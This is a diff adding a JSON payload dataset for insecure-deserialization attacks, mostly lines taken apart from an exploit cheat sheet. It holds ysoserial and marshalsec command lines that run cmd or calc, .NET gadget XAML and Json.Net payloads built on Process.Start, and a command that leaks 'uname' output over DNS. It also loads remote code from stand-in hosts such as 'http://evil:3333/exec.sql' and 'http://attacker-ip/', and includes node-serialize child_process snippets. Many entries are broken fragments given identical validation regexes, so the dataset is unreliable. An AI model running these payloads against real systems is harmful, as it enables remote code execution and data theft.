@@ -1,0 +1,2642 @@
+[
+  {
+    "payload_id": "OWP-240785",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240786",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Windows",
+    "injection_point": "query_parameter",
+    "payload_string": "./ysoserial.exe -p DotNetNuke -m read_file -f win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240787",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc\" -t",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240788",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240789",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240790",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Windows",
+    "injection_point": "query_parameter",
+    "payload_string": "./ysonet.exe -p DotNetNuke -m read_file -f win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240791",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc\" -t",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240792",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240793",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".\\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c \"calc.exe\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240795",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240796",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240797",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<ExpandedElement/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240798",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<ProjectedProperty0>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240799",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<MethodName>Parse</MethodName>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240800",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<MethodParameters>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240801",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240802",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<![CDATA[<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240803",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</anyType>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240804",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</MethodParameters>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240805",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240806",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</ProjectedProperty0>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240807",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</ExpandedWrapperOfXamlReaderObjectDataProvider>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240808",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240809",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".\\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240810",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".\\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240811",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".\\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc.exe\" -t",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240812",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240813",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'MethodName':'Start',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240814",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'MethodParameters':{",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240815",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240816",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'$values':['cmd', '/c calc.exe']",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240817",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "},",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240818",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240819",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240820",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "public void set_Path(string value){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240821",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "if (value == null){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240822",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "this.assembly = null;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240823",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "this.assembly = Assembly.LoadFrom(value);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240824",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240825",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240826",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240827",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240828",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240829",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "java -cp JavaSerializationTestSuite DeSerial yss_new.bin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240830",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240831",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ java -cp marshalsec.jar marshalsec.JsonIO Groovy \"cmd\" \"/c\" \"calc\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240832",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\\#exploit.JNDIExploit 1389",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240833",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240834",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"param\": [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240835",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240836",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"transletBytecodes\": [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240837",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"yv66v[JAVA_CLASS_B64_ENCODED]AIAEw==\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240838",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "],",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240839",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"transletName\": \"a.b\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240840",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"outputProperties\": {}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240841",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"org.springframework.context.support.FileSystemXmlApplicationContext\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240842",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"http://evil/spel.xml\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240843",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"ch.qos.logback.core.db.DriverManagerConnectionSource\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240844",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240845",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240846",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240847",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"br.com.anteros.dbcp.AnterosDBCPConfig\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240848",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"healthCheckRegistry\": \"ldap://{{interactsh-url}}\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240849",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!javax.script.ScriptEngineManager [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240850",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!java.net.URLClassLoader [[",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240851",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!java.net.URL [\"http://attacker-ip/\"]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240852",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "]]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240853",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240854",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<param-name>org.apache.myfaces.SECRET</param-name>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240855",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<param-name>org.apache.myfaces.MAC_SECRET</param-name>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240856",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "var y = {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240857",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rce : function(){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240858",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "require('child_process').exec('ls /', function(error,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240859",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "stdout, stderr) { console.log(stdout) });",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240860",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "var serialize = require('node-serialize');",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240861",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "console.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240864",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "class PHPObjectInjection{",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240865",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "public $inject;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240866",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "function __construct(){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240867",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "function __wakeup(){",
